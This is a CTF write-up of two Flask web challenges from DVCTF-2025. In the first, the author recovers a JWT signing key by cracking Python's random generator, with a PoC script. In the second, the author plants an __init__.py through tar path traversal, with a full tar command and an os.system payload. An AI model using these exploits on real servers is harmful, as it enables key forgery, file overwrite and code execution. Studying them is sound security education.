---
title: DVCT-2025-Web
published: 2025-05-26
description: 'Write-up for 2 challenges in DVCTF-2025'
image: ''
tags: [web, ctf]
category: 'write-up'
draft: false 
lang: ''
---

## Overview

This is the write-up for 2 web challenges in DVCTF-2025. I forgot the name of the first challenge so I'll call it 'Challenge 1' 😐.

## Challenge 1 (Medium level)

The challenge is a Flask-based web application running on port 10020. The goal is to retrieve a flag, likely stored in an image file (flag.webp), by exploiting vulnerabilities in the application's JWT authentication and random number generation. So below is the source code ```app.py```:
```python
from flask import Flask, jsonify, abort, make_response, render_template, request
from os import path
import jwt
import datetime
import random
import base64

def generate_random_filename():
    rdn = random.getrandbits(32)
    return f"{rdn}.webp"

image_list = [generate_random_filename() for _ in range(650)]
app = Flask(__name__)

app.config['SECRET_KEY'] = str(random.getrandbits(32))

def generate_jwt():
    payload = {
        'sub': 'user_id',
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1),
        'iat': datetime.datetime.utcnow(),
        'profilepicture': f'./images/image.webp'
    }
    header = {
        'alg': 'HS256',
        'typ': 'JWT'
    }
    token = jwt.encode(
        payload,
        app.config['SECRET_KEY'],
        algorithm='HS256',
        headers=header
    )
    return token

def verify_jwt(token):
    try:
        payload = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
        return payload
    except jwt.ExpiredSignatureError:
        print("ExpiredSignatureError")
        return False
    except jwt.InvalidTokenError:
        print("InvalidTokenError")
        return False



def encode_image_to_base64(image_path):
    with open(image_path, "rb") as image_file:
        return base64.b64encode(image_file.read()).decode('utf-8')


@app.route('/', methods=['GET'])
def home():
    token = request.cookies.get('token')  
    if token:
        print("verifying token: ",token)
        payload = verify_jwt(token)
        if payload:
            image_path = payload.get('profilepicture')
            print(image_path)
            if path.exists(image_path):
                image_base64 = encode_image_to_base64(image_path) if image_path.endswith('.webp') else encode_image_to_base64(f'./images/image.webp')
            else:
                image_base64 = encode_image_to_base64(f'./images/image.webp')


            return render_template('index.html', image_base64=image_base64)
        else:
            new_token = generate_jwt()
            new_payload = verify_jwt(new_token)
            new_image_path = new_payload.get('profilepicture')
            new_image_base64 = encode_image_to_base64(new_image_path)
            
            response = make_response(render_template('index.html',image_base64=new_image_base64))
            response.set_cookie('token', new_token)
            return response
    else:
        token = generate_jwt()
        payload = verify_jwt(token)
        image_path = payload.get('profilepicture')
        image_base64 = encode_image_to_base64(image_path)
        
        response = make_response(render_template('index.html', image_base64=image_base64))
        response.set_cookie('token', token)
        return response

@app.route('/images', methods=['GET'])
def get_all_images():
    return jsonify({'images': image_list})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10020)
```
### Source Code Analysis
The provided Flask application has the following key components:
1. __Random Filename Generation__:
    The ```generate_random_filename()``` function uses ```random.getrandbits(32)``` to generate 650 random filenames in the format ```<random_number>.webp```, stored in ```image_list```. Then, we can get this list via ```/images``` endpoint.

2. __Secret Key Generation__:
    After genertate 650 random filenames above, the Flask app's ```SECRET_KEY``` is set using ```str(random.getrandbits(32))```, a 32-bit random number generated at startup.

3. __JWT  Handling__:
    The JWT is signed using the HS256 algorithm with the ```SECRET_KEY```. That decided which ```*.webp``` will be used in ```index.html```.

### Vulnerability Identification
The key vulnerabilities are:
1. __PRNG__:
The ```random``` library in Python uses a pseudo-random number generator. If we have enough states, we can *crack* the random generator and *predict* its future states. As mentioned above, this challenge provided me with 650 states (through generating image names).
2. __JWT Forge__:
The ```SECRET_KEY``` is generated after generating the filenames. Therefore, if we crack the randomness, we can determine the key, making it easy to forge the JWT.
### Exploit
After some research on Github, I found this repo for cracking the Python randomness: [Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker). Absolute cinema 🤺 !!!. So this is my exploitation strategy:
1. Retrieve the list of filenames from ```/images```.
2. Use the random numbers in the filenames to predict the PRNG state.
3. Recover the ```SECRET_KEY```.
4. Forge a JWT with profilepicture set to ```./images/flag.webp```.
5. Use the forged JWT to access the flag image.
### PoC
This is my PoC:
```python
from randcrack import RandCrack #type: ignore
from img import *
import jwt
import datetime

img_id = [x.split('.')[0] for x in img_lst]

rc = RandCrack()
for item in img_id[26:]:
	rc.submit(int(item))

secret = str(rc.predict_randrange(0, 4294967295))
print(f"[+] Secret: {secret}")

def generate_jwt():
    payload = {
        'sub': 'user_id',
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1),
        'iat': datetime.datetime.utcnow(),
        'profilepicture': f'./images/flag.webp'
    }
    header = {
        'alg': 'HS256',
        'typ': 'JWT'
    }
    token = jwt.encode(
        payload,
        secret,
        algorithm='HS256',
        headers=header
    )
    return token

print(f"[+] Token: {generate_jwt()}")
```
This is my first public write-up, so it may contain some mistakes. I’m very grateful to receive any feedback or suggestions to help me improve.🍀

## Tarboom (Medium level)

This challenge presents a web application written in Flask that allows users to upload `.tar` archive files. Upon upload, the server saves the file, extracts its contents into a subdirectory, and displays the extracted directory tree structure via HTML rendering.
This is source code of ```app.py```:
```python
from flask import Flask, render_template, request
import os
from scripts.tarExtract import allowed_file, extract_tar, print_directory_tree

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = 'uploads'  # Directory to store uploaded TAR files
ALLOWED_EXTENSIONS = {'tar'}  # Allowed file extensions

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    """Handle file upload and display the directory tree."""
    if request.method == 'POST':
        if 'file' not in request.files:
            return "No file uploaded", 400
        
        file = request.files['file']
        if file.filename == '':
            return "No file selected", 400
        
        if not allowed_file(file.filename, ALLOWED_EXTENSIONS):
            return "Invalid file type. Only .tar files are allowed.", 400
        
        tar_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
        file.save(tar_path)
        
        extract_dir = './extracted/' + os.path.splitext(file.filename)[0]
        os.makedirs(extract_dir, exist_ok=True)
        extract_tar(tar_path, extract_dir)
        
        tree = print_directory_tree(extract_dir)
        return render_template('result.html', tree=tree)
    
    return render_template('upload.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000,debug=True)
```
and ```tarExtract.py```:
```py
import os
import tarfile

def allowed_file(filename, allowed_extensions):
    """Check if the uploaded file has an allowed extension."""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in allowed_extensions

def extract_tar(tar_path, extract_dir):
    try:
        with tarfile.open(tar_path, 'r:*') as tar:
            print(f"Extracting '{tar_path}' to '{extract_dir}'...")
            tar.extractall(path=extract_dir, filter='fully_trusted')
            print("Extraction completed successfully.")
    except tarfile.TarError as e:
        print(f"Error: Failed to extract the TAR file. {e}")

def print_directory_tree(directory, prefix=""):
    tree = []
    contents = os.listdir(directory)
    for i, item in enumerate(contents):
        item_path = os.path.join(directory, item)
        if os.path.isdir(item_path):
            tree.append(f"{prefix}├── {item}/")
            new_prefix = prefix + "│   " if i < len(contents) - 1 else prefix + "    "
            tree.extend(print_directory_tree(item_path, new_prefix))
        else:
            tree.append(f"{prefix}└── {item}")
    return tree
```
**Key behavior:**
- File uploads are stored in `uploads/`.
- Extraction occurs in `./extracted/<tar_filename_without_ext>/`.
- Extraction uses Python's `tarfile` module with `filter='fully_trusted'`.
### Vulnerability Strategy
The use of `tarfile.extractall()` with `filter='fully_trusted'` poses a severe **path traversal vulnerability**, allowing malicious tar archives to overwrite files anywhere on the filesystem, including sensitive locations such as:

- Application source directories (`./scripts/`, `./`)

This vulnerability can be weaponized by injecting a malicious file such as `__init__.py` or `app.py` into a package directory to perform **Remote Code Execution (RCE)** on the server, assuming the Flask app is restarted or re-imports the injected content.
### Exploitation Steps
Now, after identifying the vulnerability, we build an attack vector:
1. Create the folder ```/app/scripts```
2. Create the ```__init__.py``` with the content:
```py
import os
os.system('cat flag.txt > /app/templates/upload.html')
```
3. Now, we tar this folder to ```init.tar``` use:
```bash
tar -cvf init.tar --absolute-names '../../../../../../../../../../../app/scripts/__init__.py'
```
Yep, as follow the report in Synk team [Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability).
4. Upload and return to ```/``` route to get flag.






